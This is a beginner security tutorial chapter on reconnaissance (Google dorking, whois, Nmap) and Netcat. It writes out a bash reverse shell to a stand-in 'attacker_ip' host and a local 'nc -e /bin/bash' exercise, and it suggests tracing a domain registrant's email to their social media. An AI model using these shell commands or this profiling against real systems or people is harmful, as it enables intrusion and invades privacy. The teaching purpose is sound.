# Chapter 6: Networking & Reconnaissance

## Core Concepts & Definitions
**Networking** is how computers talk. **Reconnaissance** is gathering intelligence before an attack.

**Key Terminology:**
*   **IP Address:** The logical address of a machine (`192.168.1.1`).
*   **Port:** An address for a specific service (`80` for Web, `22` for SSH).
*   **Protocol:** The rules of communication (TCP, UDP, ICMP).
*   **WHOIS:** A database of domain owners.

---

## Level 1: Fundamentals
**Goal:** Gather information without touching the target server.

### 1.1 Passive Recon (OSINT)
Using public information.
*   **Google Dorking:** Advanced searches.
    *   `site:target.com filetype:pdf` -> Finds leaked PDF documents.
*   **Wayback Machine:** Viewing deleted pages of a website.

### 1.2 `ping` and `whois`
*   `ping google.com`: "Are you alive?" Checks connectivity (ICMP).
*   `whois google.com`: "Who owns you?" Checks registration info.

### Practice 1.1: The Digital Detective
**Scenario:** You investigate `megacorp.com`.
1.  Run `whois megacorp.com`.
2.  Find the "Registrant Name" or "Admin Email".
3.  Google that email to find social media profiles.

**Challenge Question 1:** What does `tracert` (Windows) or `traceroute` (Linux) do? (It maps every hop/router between you and the target).

---

## Level 2: Intermediate
**Goal:** Map the target's attack surface with Nmap.

### 2.1 Nmap (Network Mapper)
The gold standard scanner.
*   **Scan Types:**
    *   `-sS` (SYN Scan): Stealthy (Step 1 & 2 of handshake).
    *   `-sV` (Version): "Which Apache version is running?"
    *   `-p-` (All ports): Scan 1-65535.

### Practice 2.1: The Cartographer
**Scenario:** Target IP `10.10.10.5`.
1.  Run `nmap -sV -sC 10.10.10.5`.
2.  Output:
    *   `Port 22`: OpenSSH 7.2.
    *   `Port 80`: Apache 2.4.18.
3.  Analysis: Search `Exploit-DB` for "Apache 2.4.18 vulnerabilities".

**Challenge Question 2:** Why might a firewall block a "Ping" (`ICMP`) but allow a Web request (`TCP 80`)? (Security policy often blocks ICMP to hide presence, but Web must be open for business).

---

## Level 3: Advanced
**Goal:** Establish Command & Control (C2) with Netcat.

### 3.1 Netcat (`nc`)
The "Swiss Army Knife". It reads and writes TCP/UDP connections.
*   **Connect:** `nc [IP] [PORT]` -> Acts like a browser/client.
*   **Listen:** `nc -lvnp [PORT]` -> Acts like a server.

### 3.2 The Reverse Shell
The "Holy Grail" of hacking.
1.  **Attacker:** Starts a listener. `nc -lvnp 4444`.
2.  **Victim:** Runs a command that connects BACK to the attacker and gives them a shell (`/bin/sh`).
    *   Command: `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`
3.  **Result:** Attacker sees a command prompt of the victim machine.

### Practice 3.1: Catching a Shell
**Task:** Simulate a reverse shell locally.
1.  Terminal 1 (Attacker): `nc -lvnp 9001`
2.  Terminal 2 (Victim): `nc 127.0.0.1 9001 -e /bin/bash`
3.  Go back to Terminal 1. Type `ls`. You should see the files!

**Challenge Question 3:** What is a "Bind Shell"? (The opposite of Reverse Shell; the victim opens a port and listens, attacker connects to them. Less common due to firewalls blocking incoming ports).
